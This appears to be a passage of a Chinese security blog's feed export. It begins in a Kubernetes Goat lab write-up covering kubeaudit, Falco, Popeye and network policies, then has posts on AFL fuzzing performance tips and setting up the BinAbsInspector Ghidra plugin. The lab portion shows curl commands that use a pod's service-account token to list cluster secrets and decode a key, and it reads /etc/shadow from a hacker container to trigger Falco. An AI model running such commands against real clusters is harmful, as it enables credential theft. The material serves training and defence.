$&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets</span><br></pre></td></tr></table></figure><p>查看当前命名空间中的pods</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/pods</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets | grep k8svaultapikey</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  9984    0  9984    0     0   154k      0 --:--:-- --:--:-- --:--:--  154k</span><br><span class="line">          &quot;kubectl.kubernetes.io/last-applied-configuration&quot;: &quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;data\&quot;:&#123;\&quot;k8svaultapikey\&quot;:\&quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=\&quot;&#125;,\&quot;kind\&quot;:\&quot;Secret\&quot;,\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;&#125;,\&quot;name\&quot;:\&quot;vaultapikey\&quot;,\&quot;namespace\&quot;:\&quot;big-monolith\&quot;&#125;,\&quot;type\&quot;:\&quot;Opaque\&quot;&#125;\n&quot;</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;&quot;f:data&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:k8svaultapikey&quot;:&#123;&#125;&#125;,&quot;f:metadata&quot;:&#123;&quot;f:annotations&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:kubectl.kubernetes.io/last-applied-configuration&quot;:&#123;&#125;&#125;&#125;,&quot;f:type&quot;:&#123;&#125;&#125;</span><br><span class="line">        &quot;k8svaultapikey&quot;: &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot;</span><br></pre></td></tr></table></figure><p>看着是base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; | base64 -d</span><br><span class="line">k8s-goat-85057846a8046a25b35f38f3a2649dce</span><br></pre></td></tr></table></figure><p>我们回头来看部署的yaml，可以看到resources直接给了所有resources的get、 watch 和 list权限</p><p><img src="http://pic.giantbranch.cn/pic/1656062712836.png" alt></p><h1 id="KubeAudit-审计-Kubernetes-集群"><a href="#KubeAudit-审计-Kubernetes-集群" class="headerlink" title="KubeAudit - 审计 Kubernetes 集群"></a>KubeAudit - 审计 Kubernetes 集群</h1><p>kubeaudit是一个开源工具，这个工具需要cluster administrator privileges，tiller 这个账户有这个权限，所以指定serviceaccount为tiller启动hacker容器，但是我这没有这个账户，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never -it --image=madhuakula/hacker-container -- bash</span><br><span class="line">Flag --serviceaccount has been deprecated, has no effect and will be removed in the future.</span><br><span class="line">Error from server (Forbidden): pods &quot;bash&quot; is forbidden: error looking up service account kube-system/tiller: serviceaccount &quot;tiller&quot; not found</span><br></pre></td></tr></table></figure><p>我觉得本地模式ocal Mode最方便，直接在master下载一个bin，直接运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">$ ./kubeaudit all</span><br><span class="line">W0627 14:19:28.628353   95337 warnings.go:70] v1 ComponentStatus is deprecated in v1.19+</span><br><span class="line">W0627 14:19:32.831222   95337 warnings.go:70] extensions/v1beta1 Ingress is deprecated in v1.14+, unavailable in v1.22+; use networking.k8s.io/v1 Ingress</span><br><span class="line">W0627 14:19:33.253577   95337 warnings.go:70] policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class="line"></span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: v1</span><br><span class="line">  kind: Namespace</span><br><span class="line">  metadata:</span><br><span class="line">    name: big-monolith</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] MissingDefaultDenyIngressAndEgressNetworkPolicy</span><br><span class="line">   Message: Namespace is missing a default deny ingress and egress NetworkPolicy.</span><br><span class="line">   Metadata:</span><br><span class="line">      Namespace: big-monolith</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: apps/v1</span><br><span class="line">  kind: Deployment</span><br><span class="line">  metadata:</span><br><span class="line">    name: hunger-check-deployment</span><br><span class="line">    namespace: big-monolith</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] AppArmorAnnotationMissing</span><br><span class="line">   Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hunger-check&apos; should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line">      MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] CapabilityOrSecurityContextMissing</span><br><span class="line">   Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] ImageTagMissing</span><br><span class="line">   Message: Image tag is missing.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] LimitsNotSet</span><br><span class="line">   Message: Resource limits not set.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] RunAsNonRootPSCNilCSCNil</span><br><span class="line">   Message: runAsNonRoot should be set to true or runAsUser should be set to a value &gt; 0 either in the container SecurityContext or PodSecurityContext.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] AllowPrivilegeEscalationNil</span><br><span class="line">   Message: allowPrivilegeEscalation not set which allows privilege escalation. It should be set to &apos;false&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [warning] PrivilegedNil</span><br><span class="line">   Message: privileged is not set in container SecurityContext. Privileged defaults to &apos;false&apos; but it should be explicitly set to &apos;false&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] ReadOnlyRootFilesystemNil</span><br><span class="line">   Message: readOnlyRootFilesystem is not set in container SecurityContext. It should be set to &apos;true&apos;.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hunger-check</span><br><span class="line"></span><br><span class="line">-- [error] SeccompAnnotationMissing</span><br><span class="line">   Message: Seccomp annotation is missing. The annotation seccomp.security.alpha.kubernetes.io/pod: runtime/default should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      MissingAnnotation: seccomp.security.alpha.kubernetes.io/pod</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">---------------- Results for ---------------</span><br><span class="line"></span><br><span class="line">  apiVersion: batch/v1</span><br><span class="line">  kind: Job</span><br><span class="line">  metadata:</span><br><span class="line">    name: hidden-in-layers</span><br><span class="line">    namespace: default</span><br><span class="line"></span><br><span class="line">--------------------------------------------</span><br><span class="line"></span><br><span class="line">-- [error] AppArmorAnnotationMissing</span><br><span class="line">   Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hidden-in-layers&apos; should be added.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hidden-in-layers</span><br><span class="line">      MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hidden-in-layers</span><br><span class="line"></span><br><span class="line">-- [error] AutomountServiceAccountTokenTrueAndDefaultSA</span><br><span class="line">   Message: Default service account with token mounted. automountServiceAccountToken should be set to &apos;false&apos; on either the ServiceAccount or on the PodSpec or a non-default service account should be used.</span><br><span class="line"></span><br><span class="line">-- [error] CapabilityOrSecurityContextMissing</span><br><span class="line">   Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL.</span><br><span class="line">   Metadata:</span><br><span class="line">      Container: hidden-in-layers</span><br></pre></td></tr></table></figure><p>通过查看结果，这个工具会对Namespace、Deployment 、DaemonSet和Job这些类型进行检查。</p><h1 id="Falco-运行时安全监控和检测"><a href="#Falco-运行时安全监控和检测" class="headerlink" title="Falco - 运行时安全监控和检测"></a>Falco - 运行时安全监控和检测</h1><p>需要安装helm v3，安装：<a href="https://helm.sh/docs/intro/install/" target="_blank" rel="noopener">https://helm.sh/docs/intro/install/</a></p><p>将 helm chart 部署到 Kubernetes 集群中，并安装falco </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">helm repo update</span><br><span class="line">helm install falco falcosecurity/falco</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:39:48]</span><br><span class="line">$ helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">&quot;falcosecurity&quot; has been added to your repositories</span><br><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:40:12]</span><br><span class="line">$ helm repo update</span><br><span class="line">Hang tight while we grab the latest from your chart repositories...</span><br><span class="line">...Successfully got an update from the &quot;falcosecurity&quot; chart repository</span><br><span class="line">Update Complete. ⎈Happy Helming!⎈</span><br><span class="line"># root @ k8s-master  in ~/kubernetes-goat/kubeaudit [14:42:00]</span><br><span class="line">$ helm install falco falcosecurity/falco</span><br><span class="line">NAME: falco</span><br><span class="line">LAST DEPLOYED: Mon Jun 27 14:50:10 2022</span><br><span class="line">NAMESPACE: default</span><br><span class="line">STATUS: deployed</span><br><span class="line">REVISION: 1</span><br><span class="line">TEST SUITE: None</span><br><span class="line">NOTES:</span><br><span class="line">Falco agents are spinning up on each node in your cluster. After a few</span><br><span class="line">seconds, they are going to start monitoring your containers looking for</span><br><span class="line">security issues.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">No further action should be required.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Tip: </span><br><span class="line">You can easily forward Falco events to Slack, Kafka, AWS Lambda and more with falcosidekick. </span><br><span class="line">Full list of outputs: https://github.com/falcosecurity/charts/tree/master/falcosidekick.</span><br><span class="line">You can enable its deployment with `--set falcosidekick.enabled=true` or in your values.yaml. </span><br><span class="line">See: https://github.com/falcosecurity/charts/blob/master/falcosidekick/values.yaml for configuration values.</span><br></pre></td></tr></table></figure><p>Falco 可以检测任何涉及进行 Linux 系统调用的行为并发出警报。Falco 警报可以通过使用特定的系统调用、它们的参数以及调用进程的属性来触发。例如，Falco 可以轻松检测事件，包括但不限于：</p><ul><li>shell 在 Kubernetes 的容器或 pod 中运行。</li><li>容器正在特权模式下运行，或者mount到敏感路径，比如/proc。</li><li>生成意外的子进程。</li><li>意外读取敏感文件，例如/etc/shadow.</li><li>将非设备类型的文件写入/dev.</li><li>标准的系统二进制文件（例如ls）对外网络连接。</li><li>特权 pod 在 Kubernetes 集群中启动。</li></ul><p>查看falco pod的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --selector app=falco</span><br></pre></td></tr></table></figure><p>从 Falco 系统获取日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f -l app=falco</span><br></pre></td></tr></table></figure><p>我们尝试启动一个madhuakula/hacker-container，并读取敏感文件<code>/etc/shadow</code>，看看falco是否会检测到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bash</span><br><span class="line">cat /etc/shadow</span><br><span class="line">vi /etc/shadow</span><br></pre></td></tr></table></figure><p>手动获取的日志因为输出缓存区的原因可能输出会延迟，所以想快点看到结果可以多次执行命令</p><p><img src="http://pic.giantbranch.cn/pic/1656316053753.png" alt></p><h1 id="Popeye-Kubernetes-集群sanitizer"><a href="#Popeye-Kubernetes-集群sanitizer" class="headerlink" title="Popeye - Kubernetes 集群sanitizer"></a>Popeye - Kubernetes 集群sanitizer</h1><p>Popeye 是一个实用程序，可扫描实时 Kubernetes 集群并报告已部署资源和配置的潜在问题。</p><p>能够检测的问题可以查看<a href="https://popeyecli.io/的Sanitizers标题" target="_blank" rel="noopener">https://popeyecli.io/的Sanitizers标题</a></p><p>下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/derailed/popeye/releases/download/v0.10.0/popeye_Linux_x86_64.tar.gz</span><br><span class="line">tar -xvf popeye_Linux_x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>直接运行二进制文件即可</p><p><img src="http://pic.giantbranch.cn/pic/1656316615122.png" alt></p><p>最后还给你的集群评个分</p><p><img src="http://pic.giantbranch.cn/pic/1656316827296.png" alt></p><h1 id="使用-NSP-保护网络边界"><a href="#使用-NSP-保护网络边界" class="headerlink" title="使用 NSP 保护网络边界"></a>使用 NSP 保护网络边界</h1><p>创建实验环境，启动一个nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --image=nginx website --labels app=website --expose --port 80</span><br></pre></td></tr></table></figure><p>启动另一个pod尝试访问这个nginx，可以看到可以访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run --rm -it --image=alpine temp -- sh</span><br><span class="line">If you don&apos;t see a command prompt, try pressing enter.</span><br><span class="line">/ # wget -qO- http://website</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure><p>新建一个Network策略文件<code>website-deny.yaml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cat website-deny.yaml </span><br><span class="line">kind: NetworkPolicy</span><br><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: website-deny</span><br><span class="line">spec:</span><br><span class="line">  podSelector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: website</span><br><span class="line">  ingress: []</span><br><span class="line">``` </span><br><span class="line">应用这个策略</span><br></pre></td></tr></table></figure><p>$ kubectl apply -f website-deny.yaml<br>networkpolicy.networking.k8s.io/website-deny created</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再次启动一个临时pod访问</span><br></pre></td></tr></table></figure><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码中的敏感keys-Sensitive-keys-in-codebases&quot;&gt;&lt;a href=&quot;#代码中的敏感keys-Sensitive-keys-in-codebases&quot; class=&quot;headerlink&quot; title=&quot;代码中的敏感keys(Sensi
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://www.giantbranch.cn/tags/Kubernetes/"/>
    
      <category term="security" scheme="https://www.giantbranch.cn/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>AFL fuzz性能提升tips</title>
    <link href="https://www.giantbranch.cn/2022/04/26/AFL%20fuzz%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87tips/"/>
    <id>https://www.giantbranch.cn/2022/04/26/AFL fuzz性能提升tips/</id>
    <published>2022-04-26T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.050Z</updated>
    
    <content type="html"><![CDATA[<p>在其他条件相同的情况，fuzz性能的提升往往对于fuzz有事半功倍的效果，下面主要来源于afl文档的翻译</p><p>1、test cases保持小一点</p><p>大的测试用例需要更多时间与内存去解析，在模糊测试的其他步骤效率也会降低</p><p>假如你收集的样本很多很大，可以使用afl-cmin去减少数量，再用afl-tmin去减少每个样本的大小</p><p>最好不要超过1M，比如afl作者提供的testcases都是很小的，图片基本是10K以下的</p><p><a href="https://lcamtuf.coredump.cx/afl/demo/afl_testcases.tgz" target="_blank" rel="noopener">https://lcamtuf.coredump.cx/afl/demo/afl_testcases.tgz</a></p><p>2、使用更简单的目标</p><p>就是目标二进制尽量简单，毕竟执行的代码也少了</p><p>3、使用llvm插桩</p><p>默认的llvm插桩可以获得两倍的性能提升了</p><p>llvm模式下还有一个persistent模式，类似于in-process fuzzing mode，libfuzzer就是这种，性能就可以5-10倍了，不过也得看情况，有时可能只是2倍。而deferred fork server模式对于启动开销大的程序性能提升明显，这两种模式都需要编辑源码，但基本就是几行代码的事情。</p><p>4、分析优化目标二进制文件</p><p>比如有没有提高性能的参数，并不影响fuzz结果，比如测试图片处理程序，输出低质量的性能会好点；还有可以禁用输出以提升性能</p><p>还有ASAN编译的二进制对于性能的影响还是挺大的，可以考虑使用普通插桩程序fuzz，使用asan编译的二进制去过一下样本。</p><p>还有些程序使用sleep(), usleep(), or nanosleep()，——我觉得作者的意思是看看能不能删除或者减少sleep的时长？</p><p>还有其他的比如fsync()，可以使用libeatmydata来禁用，它其实是个LD_PRELOAD library</p><p>5、只插桩你需要的部分</p><p>只对我们想要测试的库插桩，全部库插桩便会降低fuzz的性能</p><p>6、并行执行fuzzer</p><p>可以启用一个-M，多个-S的方式启用多个afl-fuzz实例，还可以考虑多主机fuzz</p><p>7、控制内存使用和超时</p><p>使用-m控制内存限制，-t控制超时时间，太大可能对性能有影响，但是有时候不是用-m none，程序又fuzz不了。</p><p>对于-t，作者建议在空闲并且性能不错的机器，将时间-t下降为5可能是可能的，但是这个具体还是要看情况啦，默认也没什么大问题，可以对比下性能，自行选择</p><p>8、检查操作系统的状态与设置</p><p>下面几个因素会影响模糊测试的速度</p><ul><li>高系统负载。所以使用空闲的机器，不要运行任何不必要，还要占用cpu的程序（浏览器，播放器等）</li><li>网络文件系统（毕竟网络的，我觉得还是用本地吧），比如fuzzer的输入输出目录，fuzz目标需要的config文件，看着作者也不推荐在home目录，因为很多程序在那里搜索点开头的文件（点开头其实就是隐藏文件或目录）</li><li>CPU按需分配，有时linux系统可能低估了afl或者模糊测试器的短暂的性能需求，linux可以通过下面命令配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /sys/devices/system/cpu</span><br><span class="line">echo performance | tee cpu*/cpufreq/scaling_governor</span><br></pre></td></tr></table></figure><ul><li>禁用Transparent huge pages，假如这个启用，某些内存分配方案（例如 jemalloc） ，会对模糊测试的性能影响很大，可以通过如下命令禁用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br></pre></td></tr></table></figure><ul><li>次优的调度策略，这个可能因目标而异，linux作者推荐如下配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/kernel/sched_child_runs_first</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/sched_autogroup_enabled</span><br></pre></td></tr></table></figure><p>9、如果上面都无效，使用-d</p><p>这个模式可以使afl-fuzz跳过所有确定性的模糊测试过程</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/google/AFL/blob/master/docs/perf_tips.txt" target="_blank" rel="noopener">https://github.com/google/AFL/blob/master/docs/perf_tips.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在其他条件相同的情况，fuzz性能的提升往往对于fuzz有事半功倍的效果，下面主要来源于afl文档的翻译&lt;/p&gt;
&lt;p&gt;1、test cases保持小一点&lt;/p&gt;
&lt;p&gt;大的测试用例需要更多时间与内存去解析，在模糊测试的其他步骤效率也会降低&lt;/p&gt;
&lt;p&gt;假如你收集的样本很
      
    
    </summary>
    
    
      <category term="afl" scheme="https://www.giantbranch.cn/tags/afl/"/>
    
      <category term="fuzzing" scheme="https://www.giantbranch.cn/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>BinAbsInspector插件的使用</title>
    <link href="https://www.giantbranch.cn/2022/04/21/BinAbsInspector%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.giantbranch.cn/2022/04/21/BinAbsInspector插件的使用/</id>
    <published>2022-04-21T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.050Z</updated>
    
    <content type="html"><![CDATA[<p>昨天科恩实验室发布了BinAbsInspector，这是一款基于ghidra的静态漏洞检测插件，今天来试用一下。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>我的实验环境是windows10 x64，</p><p>1、首先下载JDK并安装，这里使用OpenJDK，进入下面页面选择jdk11，下载windows x64的即可</p><p><a href="https://adoptium.net/temurin/releases/" target="_blank" rel="noopener">https://adoptium.net/temurin/releases/</a></p><p>2、到这里下载ghidra最新版，之后解压，双击ghidraRun.bat即可运行ghidra</p><p><a href="https://github.com/NationalSecurityAgency/ghidra/releases" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency/ghidra/releases</a></p><p>3、下载Z3，我win10就下载z3-XXXX-x64-win.zip，之后解压，将z3-XXXX-x64-win\bin加入到PATH环境变量</p><p><a href="https://github.com/Z3Prover/z3/releases" target="_blank" rel="noopener">https://github.com/Z3Prover/z3/releases</a></p><p>4、下载BinAbsInspector</p><p>下载链接：<a href="https://github.com/KeenSecurityLab/BinAbsInspector/releases" target="_blank" rel="noopener">https://github.com/KeenSecurityLab/BinAbsInspector/releases</a></p><p>5、ghidra安装插件</p><p>依次点击 File → Install Extensions.</p><p>之后点击+号，选择BinAbsInspector解压后的目录或者直接选择BinAbsInspector的zip压缩包都可以，之后就看到BinAbsInspector</p><p><img src="http://pic.giantbranch.cn/pic/1650597486893.png" alt></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>我打开了一个很久以前的ctf的uaf的pwn题目，都好几年没搞过了，用这个试试效果，有帮助，但没有超出预期</p><p>打开二进制后，需要分析，分析完成后才能使用插件（默认分析参数即可）</p><p><img src="http://pic.giantbranch.cn/pic/1650597634561.png" alt></p><p>之后点击Window -&gt; Script Manager，找到BinAbsInspector.java</p><p><img src="http://pic.giantbranch.cn/pic/1650597710558.png" alt></p><p>双击或者右键点击Run都可以，之后默认参数，假如你理解参数也可以修改</p><p><img src="http://pic.giantbranch.cn/pic/1650597779904.png" alt></p><p><img src="http://pic.giantbranch.cn/pic/1650597800553.png" alt></p><p>之后就看log就行，点击地址即可跳转到对应地方</p><p><img src="http://pic.giantbranch.cn/pic/1650597845530.png" alt></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/NationalSecurityAgency/ghidra#install" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency/ghidra#install</a><br><a href="https://github.com/KeenSecurityLab/BinAbsInspector" target="_blank" rel="noopener">https://github.com/KeenSecurityLab/BinAbsInspector</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天科恩实验室发布了BinAbsInspector，这是一款基于ghidra的静态漏洞检测插件，今天来试用一下。&lt;/p&gt;
